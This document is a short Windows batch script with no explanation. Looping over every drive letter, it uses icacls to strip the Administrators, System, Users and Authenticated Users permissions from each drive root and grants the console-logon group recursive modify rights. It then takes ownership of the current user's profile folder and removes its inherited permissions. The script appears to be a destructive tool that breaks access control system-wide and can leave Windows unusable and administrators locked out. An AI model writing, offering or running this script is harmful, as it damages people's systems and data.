@echo off
for %%d in (A: B: C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) do (
    icacls %%d\ /remove "Administrators"
    icacls %%d\ /grant Administrators:(OI)(CI)(RX)
    icacls %%d\ /grant *S-1-2-1:(OI)(CI)(M) /T /C
    icacls %%d\ /remove "System"
    icacls %%d\ /remove "Users"
    icacls %%d\ /remove "Authenticated Users"
)
icacls C:\ /grant System:(OI)(CI)(F) /T /C
set "folderPath=C:\Users\%username%"
takeown /F %folderPath% /R /D Y
icacls %folderPath% /inheritance:r
icacls %folderPath% /grant %username%:(F) /T /C
